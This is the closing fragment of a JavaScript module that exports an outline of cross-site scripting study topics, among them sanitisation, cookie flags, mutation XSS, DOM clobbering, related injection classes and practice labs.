        DOMPurify allowlist
      HttpOnly Secure SameSite cookies
    Advanced senior topics
      Mutation XSS mXSS
      DOM clobbering
      postMessage origin checks
    Ecosystem
      CSRF opposite direction
      SQL Injection same root cause
      OWASP Top 10 A03 Injection
      Cookies and Sessions
      Secrets Management
    Practice
      Interview questions
      Coding challenges
      Hands-on labs
      Case studies: Samy worm mXSS research
~~~
`,
};

export default xss;
